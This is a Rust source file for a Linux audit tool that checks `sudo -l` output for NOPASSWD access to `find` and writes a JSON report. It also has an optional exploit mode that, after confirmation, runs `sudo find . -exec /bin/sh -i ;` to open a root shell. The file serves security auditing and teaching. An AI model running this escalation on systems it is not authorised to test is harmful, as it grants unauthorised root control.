use std::io::{self, Write};
use std::process::Command;

use chrono::Utc;
use clap::Parser;
use serde::Serialize;

/// Sudo NOPASSWD + `find` misconfiguration checker (research / authorized use only).
#[derive(Parser, Debug)]
#[command(name = "sudo-privesc-rust", version, about)]
struct Cli {
    #[command(flatten)]
    action: Action,
    /// Write results to `audit_results.json` instead of printing to the terminal.
    #[arg(long)]
    json: bool,
}

#[derive(Parser, Debug)]
#[group(required = true, multiple = false)]
struct Action {
    /// Only check `sudo -l` and report if the risky pattern is present (no exploit).
    #[arg(long)]
    check: bool,
    /// If vulnerable, prompt for confirmation, then attempt the demonstration escalation.
    #[arg(long)]
    exploit: bool,
}

#[derive(Serialize)]
struct AuditResults {
    tool: &'static str,
    /// Scan time (RFC 3339, UTC).
    timestamp: String,
    /// Risk level for auditors: `High` when a matching misconfiguration is present.
    severity: String,
    /// Intended assessment platform (this tool targets Linux sudo policies).
    target_os: &'static str,
    mode: &'static str,
    sudo_fetch: SudoFetchAudit,
    vulnerability_detected: bool,
    exploit: Option<ExploitAudit>,
}

#[derive(Serialize)]
struct SudoFetchAudit {
    ok: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
    /// Truncated for safety; full rules may be large.
    #[serde(skip_serializing_if = "Option::is_none")]
    sudo_l_stdout_preview: Option<String>,
}

#[derive(Serialize)]
struct ExploitAudit {
    attempted: bool,
    #[serde(skip_serializing_if = "Option::is_none")]
    user_confirmed: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    exit_success: Option<bool>,
    #[serde(skip_serializing_if = "Option::is_none")]
    error: Option<String>,
}

fn main() {
    let cli = Cli::parse();

    let mode_check = cli.action.check;
    let mode_exploit = cli.action.exploit;
    let use_json = cli.json;

    if !use_json {
        print_banner();
    }

    // Adım 1: `sudo -l` ile kullanıcının sudo kurallarını oku
    if !use_json {
        println!("[*] Scanning for vulnerabilities...");
        println!("[*] Step 1: Checking sudo permissions for the current user...");
    }

    let fetch_result = fetch_sudo_rules();

    match fetch_result {
        Ok(rules) => {
            if !use_json {
                println!("[+] Sudo policy retrieved successfully.");
                println!("[*] Step 2: Analyzing rules for NOPASSWD on /usr/bin/find...");
            }

            let vulnerable = (rules.contains("/usr/bin/find") || rules.contains(" find ")) && rules.contains("NOPASSWD");

            if mode_check {
                run_check_mode(vulnerable, &rules, use_json);
                return;
            }

            if mode_exploit {
                run_exploit_mode(vulnerable, &rules, use_json);
            }
        }
        Err(msg) => {
            if use_json {
                let audit = AuditResults {
                    tool: "sudo-privesc-rust",
                    timestamp: audit_timestamp(),
                    severity: audit_severity(false, false),
                    target_os: "Linux",
                    mode: if mode_check { "check" } else { "exploit" },
                    sudo_fetch: SudoFetchAudit {
                        ok: false,
                        error: Some(msg.clone()),
                        sudo_l_stdout_preview: None,
                    },
                    vulnerability_detected: false,
                    exploit: None,
                };
                if let Err(e) = save_audit_report(&audit) {
                    eprintln!("[!] Failed to write audit_results.json: {e}");
                }
            } else {
                eprintln!("[!] {msg}");
            }
        }
    }
}

fn run_check_mode(vulnerable: bool, rules: &str, use_json: bool) {
    if use_json {
        let audit = AuditResults {
            tool: "sudo-privesc-rust",
            timestamp: audit_timestamp(),
            severity: audit_severity(vulnerable, true),
            target_os: "Linux",
            mode: "check",
            sudo_fetch: SudoFetchAudit {
                ok: true,
                error: None,
                sudo_l_stdout_preview: Some(truncate_preview(rules, 4000)),
            },
            vulnerability_detected: vulnerable,
            exploit: None,
        };
        if let Err(e) = save_audit_report(&audit) {
            eprintln!("[!] Failed to write audit_results.json: {e}");
        }
        return;
    }

    if vulnerable {
        println!("[!] Finding: /usr/bin/find may be callable with NOPASSWD (high risk).");
        println!("[*] Reference: GTFOBins privilege escalation pattern for `find`.");
        println!("[*] (--check) Exploit path was not executed.");
    } else {
        println!("[-] No immediate 'find' + NOPASSWD pattern detected in `sudo -l` output.");
        println!("[*] Recommendation: manually review /etc/sudoers and included files.");
    }
}

fn run_exploit_mode(vulnerable: bool, rules: &str, use_json: bool) {
    if !vulnerable {
        if use_json {
            let audit = AuditResults {
                tool: "sudo-privesc-rust",
                timestamp: audit_timestamp(),
                severity: audit_severity(false, true),
                target_os: "Linux",
                mode: "exploit",
                sudo_fetch: SudoFetchAudit {
                    ok: true,
                    error: None,
                    sudo_l_stdout_preview: Some(truncate_preview(rules, 4000)),
                },
                vulnerability_detected: false,
                exploit: Some(ExploitAudit {
                    attempted: false,
                    user_confirmed: None,
                    exit_success: None,
                    error: None,
                }),
            };
            if let Err(e) = save_audit_report(&audit) {
                eprintln!("[!] Failed to write audit_results.json: {e}");
            }
        } else {
            println!("[-] No immediate 'find' + NOPASSWD pattern detected in `sudo -l` output.");
            println!("[*] Recommendation: manually review /etc/sudoers and included files.");
        }
        return;
    }

    if use_json {
        // Still need user confirmation for exploit; we prompt on stderr so JSON stays file-only on stdout conceptually — user asked no screen for *results*; prompt is interactive.
        eprint!("[?] Run the demonstration escalation? (y/n): ");
        let _ = io::stderr().flush();
        let mut input = String::new();
        let read_ok = io::stdin().read_line(&mut input).map(|_| ()).ok();
        let confirmed = read_ok.is_some() && input.trim().eq_ignore_ascii_case("y");

        let exploit_outcome = if confirmed {
            Some(execute_exploit_capture())
        } else {
            None
        };

        let exploit = ExploitAudit {
            attempted: confirmed,
            user_confirmed: Some(confirmed),
            exit_success: exploit_outcome.as_ref().map(|o| o.success),
            error: exploit_outcome.and_then(|o| o.error),
        };

        let audit = AuditResults {
            tool: "sudo-privesc-rust",
            timestamp: audit_timestamp(),
            severity: audit_severity(true, true),
            target_os: "Linux",
            mode: "exploit",
            sudo_fetch: SudoFetchAudit {
                ok: true,
                error: None,
                sudo_l_stdout_preview: Some(truncate_preview(rules, 4000)),
            },
            vulnerability_detected: true,
            exploit: Some(exploit),
        };
        if let Err(e) = save_audit_report(&audit) {
            eprintln!("[!] Failed to write audit_results.json: {e}");
        }
        return;
    }

    println!("[!] Finding: /usr/bin/find may be callable with NOPASSWD (high risk).");
    println!("[*] Reference: GTFOBins privilege escalation pattern for `find`.");

    print!("[?] Run the demonstration escalation? (y/n): ");
    if let Err(e) = io::stdout().flush() {
        eprintln!("[!] An error occurred while writing to the terminal: {e}");
        return;
    }

    let mut input = String::new();
    match io::stdin().read_line(&mut input) {
        Ok(_) => {
            if input.trim().eq_ignore_ascii_case("y") {
                execute_exploit();
            } else {
                println!("[*] Demonstration skipped by user.");
            }
        }
        Err(e) => {
            eprintln!("[!] An error occurred while reading your input: {e}");
        }
    }
}

struct ExploitCapture {
    success: bool,
    error: Option<String>,
}

fn execute_exploit_capture() -> ExploitCapture {
    let status = Command::new("sudo")
        .args(["find", ".", "-exec", "/bin/sh", "-i", ";"])
        .status();

    match status {
        Ok(code) => ExploitCapture {
            success: code.success(),
            error: if code.success() {
                None
            } else {
                Some(format!("non-zero exit status: {code}"))
            },
        },
        Err(e) => ExploitCapture {
            success: false,
            error: Some(format!("{e}")),
        },
    }
}

/// `sudo -l` çıktısını alır; başarısızlıkta anlaşılır İngilizce hata döner.
fn fetch_sudo_rules() -> Result<String, String> {
    let output = Command::new("sudo")
        .arg("-l")
        .output()
        .map_err(|_| {
            "An error occurred while checking sudo permissions: could not run `sudo`. \
             Ensure `sudo` is installed and available in PATH."
                .to_string()
        })?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();
        let detail = if stderr.is_empty() {
            "`sudo -l` exited with an error. You may lack sudo privileges, or a password may be required."
        } else {
            stderr.as_str()
        };
        return Err(format!(
            "An error occurred while checking sudo permissions: {detail}"
        ));
    }

    Ok(String::from_utf8_lossy(&output.stdout).into_owned())
}

/// GTFOBins: `find` + `-exec` ile root kabuğu (yalnızca yetkili lab ortamlarında).
fn execute_exploit() {
    println!("[+] Step 3: Executing demonstration: sudo find . -exec /bin/sh -i \\;");

    let status = Command::new("sudo")
        .args(["find", ".", "-exec", "/bin/sh", "-i", ";"])
        .status();

    match status {
        Ok(code) if code.success() => {
            println!("\n[+] Demonstration finished (process exited successfully).");
        }
        Ok(code) => {
            println!("\n[!] Demonstration ended with a non-zero exit status: {code}");
        }
        Err(e) => {
            println!("\n[!] An error occurred while running the demonstration: {e}");
        }
    }
}

fn print_banner() {
    println!("============================================================");
    println!("  Sudo Privilege Escalation Scanner (Rust) — research build");
    println!("  Focus: sudo misconfiguration (NOPASSWD + /usr/bin/find)");
    println!("============================================================");
    println!();
}

fn truncate_preview(s: &str, max_bytes: usize) -> String {
    if s.len() <= max_bytes {
        return s.to_string();
    }
    let mut end = max_bytes;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    format!("{}… [truncated]", &s[..end])
}

/// RFC 3339 timestamp in UTC for audit trail.
fn audit_timestamp() -> String {
    Utc::now().to_rfc3339()
}

/// `High` when the scanner reports a matching misconfiguration; otherwise informational / error.
fn audit_severity(vulnerable: bool, sudo_fetch_ok: bool) -> String {
    if !sudo_fetch_ok {
        "Error".to_string()
    } else if vulnerable {
        "High".to_string()
    } else {
        "Informational".to_string()
    }
}

fn write_audit_json(audit: &AuditResults) -> std::io::Result<()> {
    let path = "audit_results.json";
    let json = serde_json::to_string_pretty(audit)
        .map_err(|e| std::io::Error::new(std::io::ErrorKind::Other, e))?;
    std::fs::write(path, json)?;
    Ok(())
}

/// Persist JSON and print a single professional confirmation line (for `--json` mode).
fn save_audit_report(audit: &AuditResults) -> std::io::Result<()> {
    write_audit_json(audit)?;
    print_audit_report_saved();
    Ok(())
}

fn print_audit_report_saved() {
    const GREEN: &str = "\x1b[32m";
    const RESET: &str = "\x1b[0m";
    println!(
        "{GREEN}[+] Security audit completed. Report saved to audit_results.json{RESET}"
    );
}
